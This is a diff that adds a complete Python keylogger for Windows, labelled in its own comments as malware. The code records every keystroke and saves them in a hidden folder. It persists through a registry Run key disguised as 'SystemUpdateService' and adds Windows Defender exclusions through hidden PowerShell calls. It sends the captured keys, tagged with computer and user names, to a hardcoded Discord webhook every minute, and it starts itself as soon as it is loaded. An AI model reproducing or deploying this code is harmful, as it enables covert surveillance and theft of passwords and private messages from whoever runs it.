@@ -1,1 +1,210 @@
+import os
+import sys
+import subprocess
+import ctypes
+from pynput import keyboard
+import threading
+import winreg as reg
+from pathlib import Path
+import json
+import urllib.request
+from datetime import datetime
+import time
 
+# Configuration
+WEBHOOK_URL = "https://discord.com/api/webhooks/1472985261515473040/cSj8MHrjQOodahsHzCAbJeD-rJtcUg_rnQ-wNfkLQ6k_5NQYXfG1ufAecjpibhwHZ3-P"
+LOG_DIR = os.path.join(os.getenv('APPDATA'), 'SystemCache')
+LOG_FILE = os.path.join(LOG_DIR, 'syslog.dat')
+SCRIPT_PATH = os.path.abspath(sys.argv[0])
+SEND_INTERVAL = 60  # Send logs every 60 seconds
+
+# Global buffer for keystrokes
+keystroke_buffer = []
+buffer_lock = threading.Lock()
+
+def setup_persistence():
+    """Add to Windows startup via registry"""
+    try:
+        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(key, 'SystemUpdateService', 0, reg.REG_SZ, f'pythonw.exe "{SCRIPT_PATH}"')
+        reg.CloseKey(key)
+    except:
+        pass
+
+def add_defender_exclusion():
+    """Attempt to add script path to Windows Defender exclusions"""
+    try:
+        commands = [
+            f'Add-MpPreference -ExclusionPath "{os.path.dirname(SCRIPT_PATH)}"',
+            f'Add-MpPreference -ExclusionPath "{LOG_DIR}"',
+            f'Add-MpPreference -ExclusionPath "{SCRIPT_PATH}"',
+        ]
+        
+        for cmd in commands:
+            try:
+                subprocess.run(
+                    ['powershell', '-Command', cmd],
+                    capture_output=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            except:
+                pass
+    except:
+        pass
+
+def setup_logging_directory():
+    """Create hidden directory for logs"""
+    try:
+        Path(LOG_DIR).mkdir(parents=True, exist_ok=True)
+        ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, 2)
+    except:
+        pass
+
+def send_to_webhook(content):
+    """Send logged data to Discord webhook"""
+    try:
+        if not content or len(content.strip()) == 0:
+            return
+        
+        # Get computer name for identification
+        computer_name = os.getenv('COMPUTERNAME', 'Unknown')
+        username = os.getenv('USERNAME', 'Unknown')
+        
+        # Format message
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # Split content into chunks if too long (Discord limit is 2000 chars)
+        max_length = 1900
+        chunks = [content[i:i+max_length] for i in range(0, len(content), max_length)]
+        
+        for chunk in chunks:
+            payload = {
+                "embeds": [{
+                    "title": f"Keylog - {computer_name}\\{username}",
+                    "description": f"```\n{chunk}\n```",
+                    "color": 3447003,
+                    "footer": {
+                        "text": timestamp
+                    }
+                }]
+            }
+            
+            data = json.dumps(payload).encode('utf-8')
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=data,
+                headers={'Content-Type': 'application/json'}
+            )
+            
+            try:
+                urllib.request.urlopen(req, timeout=10)
+                time.sleep(1)  # Avoid rate limiting
+            except:
+                pass
+    except:
+        pass
+
+def log_to_file(text):
+    """Save to local file as backup"""
+    try:
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(text)
+    except:
+        pass
+
+def log_key(key):
+    """Log keystroke to buffer and file"""
+    global keystroke_buffer
+    
+    try:
+        key_text = ''
+        
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                key_text = key.char
+            else:
+                # Handle special keys
+                key_name = str(key).replace('Key.', '')
+                if key_name == 'space':
+                    key_text = ' '
+                elif key_name == 'enter':
+                    key_text = '\n'
+                elif key_name == 'tab':
+                    key_text = '\t'
+                elif key_name == 'backspace':
+                    key_text = '[BACKSPACE]'
+                else:
+                    key_text = f'[{key_name.upper()}]'
+        except:
+            key_text = f'[{str(key)}]'
+        
+        # Add to buffer
+        with buffer_lock:
+            keystroke_buffer.append(key_text)
+        
+        # Also log to file
+        log_to_file(key_text)
+        
+    except:
+        pass
+
+def send_buffer_periodically():
+    """Periodically send buffered keystrokes to webhook"""
+    global keystroke_buffer
+    
+    while True:
+        try:
+            time.sleep(SEND_INTERVAL)
+            
+            # Get and clear buffer
+            with buffer_lock:
+                if len(keystroke_buffer) > 0:
+                    content = ''.join(keystroke_buffer)
+                    keystroke_buffer = []
+                else:
+                    content = None
+            
+            # Send if we have content
+            if content:
+                send_to_webhook(content)
+                
+        except:
+            pass
+
+def start_keylogger():
+    """Start the keylogger in background"""
+    try:
+        listener = keyboard.Listener(on_press=log_key)
+        listener.start()
+    except:
+        pass
+
+def start_webhook_sender():
+    """Start the webhook sender thread"""
+    try:
+        sender_thread = threading.Thread(target=send_buffer_periodically, daemon=True)
+        sender_thread.start()
+    except:
+        pass
+
+# Main execution
+def initialize():
+    """Initialize all malware components"""
+    try:
+        setup_logging_directory()
+        setup_persistence()
+        add_defender_exclusion()
+        
+        # Start keylogger in background thread
+        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
+        keylogger_thread.start()
+        
+        # Start webhook sender thread
+        start_webhook_sender()
+        
+    except:
+        pass
+
+# Auto-execute when loaded
+initialize()
